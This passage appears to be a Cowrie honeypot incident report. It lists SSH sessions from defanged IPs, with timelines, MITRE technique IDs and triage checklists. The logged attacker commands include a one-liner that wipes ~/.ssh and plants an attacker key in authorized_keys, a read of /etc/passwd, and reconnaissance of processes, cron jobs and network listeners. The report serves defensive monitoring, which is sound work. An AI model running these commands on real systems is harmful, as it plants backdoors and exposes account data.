| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:05:03` | `cowrie.session.connect` |
| `2026-07-13 12:05:03` | `cowrie.login.success` |
| `2026-07-13 12:05:04` | `cowrie.session.params` |
| `2026-07-13 12:05:04` | `cowrie.command.input` |
| `2026-07-13 12:05:13` | `cowrie.log.closed` |
| `2026-07-13 12:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022f6a3e3d91

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:05 |
| **Last Seen** | 2026-07-13 12:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:05:13` | `cowrie.session.connect` |
| `2026-07-13 12:05:13` | `cowrie.login.success` |
| `2026-07-13 12:05:14` | `cowrie.session.params` |
| `2026-07-13 12:05:14` | `cowrie.command.input` |
| `2026-07-13 12:05:23` | `cowrie.log.closed` |
| `2026-07-13 12:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c001df36fad5

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:05 |
| **Last Seen** | 2026-07-13 12:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:05:23` | `cowrie.session.connect` |
| `2026-07-13 12:05:23` | `cowrie.login.success` |
| `2026-07-13 12:05:24` | `cowrie.session.params` |
| `2026-07-13 12:05:24` | `cowrie.command.input` |
| `2026-07-13 12:05:33` | `cowrie.log.closed` |
| `2026-07-13 12:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1373b9f0a4e3

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]243` |
| **First Seen** | 2026-07-13 12:05 |
| **Last Seen** | 2026-07-13 12:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:05:33` | `cowrie.session.connect` |
| `2026-07-13 12:05:34` | `cowrie.login.success` |
| `2026-07-13 12:05:34` | `cowrie.session.params` |
| `2026-07-13 12:05:34` | `cowrie.command.input` |
| `2026-07-13 12:05:43` | `cowrie.log.closed` |
| `2026-07-13 12:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]243` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c87164ddcd

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]2` |
| **First Seen** | 2026-07-13 12:06 |
| **Last Seen** | 2026-07-13 12:11 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:06:10` | `cowrie.session.connect` |
| `2026-07-13 12:06:10` | `cowrie.client.version` |
| `2026-07-13 12:06:10` | `cowrie.client.kex` |
| `2026-07-13 12:06:12` | `cowrie.login.success` |
| `2026-07-13 12:06:13` | `cowrie.session.params` |
| `2026-07-13 12:06:13` | `cowrie.command.input` |
| `2026-07-13 12:06:13` | `cowrie.command.failed` |
| `2026-07-13 12:06:14` | `cowrie.log.closed` |
| `2026-07-13 12:06:15` | `cowrie.session.params` |
| `2026-07-13 12:06:15` | `cowrie.command.input` |
| `2026-07-13 12:06:15` | `cowrie.session.file_download` |
| `2026-07-13 12:06:15` | `cowrie.log.closed` |
| `2026-07-13 12:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]2` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7678e05df664

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-13 12:06 |
| **Last Seen** | 2026-07-13 12:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:06:54` | `cowrie.session.connect` |
| `2026-07-13 12:06:55` | `cowrie.client.version` |
| `2026-07-13 12:06:55` | `cowrie.client.kex` |
| `2026-07-13 12:06:57` | `cowrie.login.success` |
| `2026-07-13 12:06:58` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f80686f16b67

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-07-13 12:07 |
| **Last Seen** | 2026-07-13 12:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:07:12` | `cowrie.session.connect` |
| `2026-07-13 12:07:13` | `cowrie.client.version` |
| `2026-07-13 12:07:13` | `cowrie.client.kex` |
| `2026-07-13 12:07:23` | `cowrie.login.success` |
| `2026-07-13 12:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747b37b45e9b

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-13 12:08 |
| **Last Seen** | 2026-07-13 12:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:08:21` | `cowrie.session.connect` |
| `2026-07-13 12:08:22` | `cowrie.client.version` |
| `2026-07-13 12:08:22` | `cowrie.client.kex` |
| `2026-07-13 12:08:24` | `cowrie.login.success` |
| `2026-07-13 12:08:25` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea229a76d51a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-13 12:09 |
| **Last Seen** | 2026-07-13 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:09:49` | `cowrie.session.connect` |
| `2026-07-13 12:09:49` | `cowrie.client.version` |
| `2026-07-13 12:09:49` | `cowrie.client.kex` |
| `2026-07-13 12:09:49` | `cowrie.login.success` |
| `2026-07-13 12:09:49` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:09:50` | `cowrie.direct-tcpip.ja4` |
| `2026-07-13 12:09:50` | `cowrie.direct-tcpip.data` |
| `2026-07-13 12:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb013370a73

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-07-13 12:12 |
| **Last Seen** | 2026-07-13 12:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:12:02` | `cowrie.session.connect` |
| `2026-07-13 12:12:03` | `cowrie.client.version` |
| `2026-07-13 12:12:03` | `cowrie.client.kex` |
| `2026-07-13 12:12:06` | `cowrie.login.success` |
| `2026-07-13 12:12:07` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f920e288ba

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-07-13 12:12 |
| **Last Seen** | 2026-07-13 12:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:12:12` | `cowrie.session.connect` |
| `2026-07-13 12:12:13` | `cowrie.client.version` |
| `2026-07-13 12:12:13` | `cowrie.client.kex` |
| `2026-07-13 12:12:15` | `cowrie.login.success` |
| `2026-07-13 12:12:15` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-248834ee376f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 12:18 |
| **Last Seen** | 2026-07-13 12:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:18:55` | `cowrie.session.connect` |
| `2026-07-13 12:18:55` | `cowrie.client.version` |
| `2026-07-13 12:18:55` | `cowrie.client.kex` |
| `2026-07-13 12:18:58` | `cowrie.login.success` |
| `2026-07-13 12:19:02` | `cowrie.session.params` |
| `2026-07-13 12:19:02` | `cowrie.command.input` |
| `2026-07-13 12:19:02` | `cowrie.log.closed` |
| `2026-07-13 12:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4006811843ec

| Field | Detail |
|---|---|
| **Source IP** | `81.214.38[.]139` |
| **First Seen** | 2026-07-13 12:20 |
| **Last Seen** | 2026-07-13 12:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:20:41` | `cowrie.session.connect` |
| `2026-07-13 12:20:41` | `cowrie.client.version` |
| `2026-07-13 12:20:41` | `cowrie.client.kex` |
| `2026-07-13 12:20:43` | `cowrie.login.success` |
| `2026-07-13 12:20:43` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.38[.]139` to AbuseIPDB if not already reported
- [ ] Block `81.214.38[.]139` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0bf30447042

| Field | Detail |
|---|---|
| **Source IP** | `219.129.236[.]174` |
| **First Seen** | 2026-07-13 12:20 |
| **Last Seen** | 2026-07-13 12:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:20:49` | `cowrie.session.connect` |
| `2026-07-13 12:20:50` | `cowrie.client.version` |
| `2026-07-13 12:20:50` | `cowrie.client.kex` |
| `2026-07-13 12:20:53` | `cowrie.login.success` |
| `2026-07-13 12:20:53` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.236[.]174` to AbuseIPDB if not already reported
- [ ] Block `219.129.236[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8278534d2774

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-13 12:25 |
| **Last Seen** | 2026-07-13 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:25:55` | `cowrie.session.connect` |
| `2026-07-13 12:25:55` | `cowrie.client.version` |
| `2026-07-13 12:25:55` | `cowrie.client.kex` |
| `2026-07-13 12:25:56` | `cowrie.login.success` |
| `2026-07-13 12:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e6dae4f97e

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-13 12:25 |
| **Last Seen** | 2026-07-13 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:25:56` | `cowrie.session.connect` |
| `2026-07-13 12:25:56` | `cowrie.client.version` |
| `2026-07-13 12:25:57` | `cowrie.client.kex` |
| `2026-07-13 12:25:57` | `cowrie.login.success` |
| `2026-07-13 12:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98995de11be8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-13 12:28 |
| **Last Seen** | 2026-07-13 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:28:55` | `cowrie.session.connect` |
| `2026-07-13 12:28:55` | `cowrie.client.version` |
| `2026-07-13 12:28:55` | `cowrie.client.kex` |
| `2026-07-13 12:28:56` | `cowrie.login.success` |
| `2026-07-13 12:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3bfa1076f1a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-13 12:28 |
| **Last Seen** | 2026-07-13 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:28:55` | `cowrie.session.connect` |
| `2026-07-13 12:28:55` | `cowrie.client.version` |
| `2026-07-13 12:28:55` | `cowrie.client.kex` |
| `2026-07-13 12:28:56` | `cowrie.login.success` |
| `2026-07-13 12:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-805647081c5b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:17` | `cowrie.session.connect` |
| `2026-07-13 12:31:17` | `cowrie.client.version` |
| `2026-07-13 12:31:17` | `cowrie.client.kex` |
| `2026-07-13 12:31:18` | `cowrie.login.success` |
| `2026-07-13 12:31:19` | `cowrie.client.var` |
| `2026-07-13 12:31:19` | `cowrie.client.var` |
| `2026-07-13 12:31:19` | `cowrie.session.params` |
| `2026-07-13 12:31:19` | `cowrie.command.input` |
| `2026-07-13 12:31:19` | `cowrie.log.closed` |
| `2026-07-13 12:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772f532005c1

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:20` | `cowrie.session.connect` |
| `2026-07-13 12:31:20` | `cowrie.client.version` |
| `2026-07-13 12:31:20` | `cowrie.client.kex` |
| `2026-07-13 12:31:21` | `cowrie.login.success` |
| `2026-07-13 12:31:22` | `cowrie.client.var` |
| `2026-07-13 12:31:22` | `cowrie.client.var` |
| `2026-07-13 12:31:22` | `cowrie.session.params` |
| `2026-07-13 12:31:22` | `cowrie.command.input` |
| `2026-07-13 12:31:22` | `cowrie.log.closed` |
| `2026-07-13 12:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65097eb11507

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ip addr 2>/dev/null || ifconfig 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:23` | `cowrie.session.connect` |
| `2026-07-13 12:31:23` | `cowrie.client.version` |
| `2026-07-13 12:31:23` | `cowrie.client.kex` |
| `2026-07-13 12:31:24` | `cowrie.login.success` |
| `2026-07-13 12:31:25` | `cowrie.client.var` |
| `2026-07-13 12:31:25` | `cowrie.client.var` |
| `2026-07-13 12:31:25` | `cowrie.session.params` |
| `2026-07-13 12:31:25` | `cowrie.command.input` |
| `2026-07-13 12:31:25` | `cowrie.command.failed` |
| `2026-07-13 12:31:25` | `cowrie.log.closed` |
| `2026-07-13 12:31:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37eba0bb1ee6

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null` |
| **TTPs (MITRE)** | T1057 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:26` | `cowrie.session.connect` |
| `2026-07-13 12:31:26` | `cowrie.client.version` |
| `2026-07-13 12:31:26` | `cowrie.client.kex` |
| `2026-07-13 12:31:27` | `cowrie.login.success` |
| `2026-07-13 12:31:28` | `cowrie.client.var` |
| `2026-07-13 12:31:28` | `cowrie.client.var` |
| `2026-07-13 12:31:29` | `cowrie.session.params` |
| `2026-07-13 12:31:29` | `cowrie.command.input` |
| `2026-07-13 12:31:29` | `cowrie.command.failed` |
| `2026-07-13 12:31:29` | `cowrie.log.closed` |
| `2026-07-13 12:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a9bd452714

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ps aux 2>/dev/null` |
| **TTPs (MITRE)** | T1057 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:29` | `cowrie.session.connect` |
| `2026-07-13 12:31:29` | `cowrie.client.version` |
| `2026-07-13 12:31:29` | `cowrie.client.kex` |
| `2026-07-13 12:31:31` | `cowrie.login.success` |
| `2026-07-13 12:31:31` | `cowrie.client.var` |
| `2026-07-13 12:31:31` | `cowrie.client.var` |
| `2026-07-13 12:31:32` | `cowrie.session.params` |
| `2026-07-13 12:31:32` | `cowrie.command.input` |
| `2026-07-13 12:31:32` | `cowrie.log.closed` |
| `2026-07-13 12:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e9fd3bfef4

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null` |
| **TTPs (MITRE)** | T1053.003 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:32` | `cowrie.session.connect` |
| `2026-07-13 12:31:32` | `cowrie.client.version` |
| `2026-07-13 12:31:33` | `cowrie.client.kex` |
| `2026-07-13 12:31:34` | `cowrie.login.success` |
| `2026-07-13 12:31:34` | `cowrie.client.var` |
| `2026-07-13 12:31:34` | `cowrie.client.var` |
| `2026-07-13 12:31:35` | `cowrie.session.params` |
| `2026-07-13 12:31:35` | `cowrie.command.input` |
| `2026-07-13 12:31:35` | `cowrie.log.closed` |
| `2026-07-13 12:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580ce4ed42d8

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat /etc/passwd 2>/dev/null | grep -E '(/bin/sh|/bin/bash|/bin/zsh)'` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:31:35` | `cowrie.session.connect` |
| `2026-07-13 12:31:35` | `cowrie.client.version` |
| `2026-07-13 12:31:36` | `cowrie.client.kex` |
| `2026-07-13 12:31:37` | `cowrie.login.success` |
| `2026-07-13 12:31:37` | `cowrie.client.var` |
| `2026-07-13 12:31:37` | `cowrie.client.var` |
| `2026-07-13 12:31:38` | `cowrie.session.params` |
| `2026-07-13 12:31:38` | `cowrie.command.input` |
| `2026-07-13 12:31:38` | `cowrie.log.closed` |
| `2026-07-13 12:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8be292ec85c1

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:31 |
| **Last Seen** | 2026-07-13 12:31 |
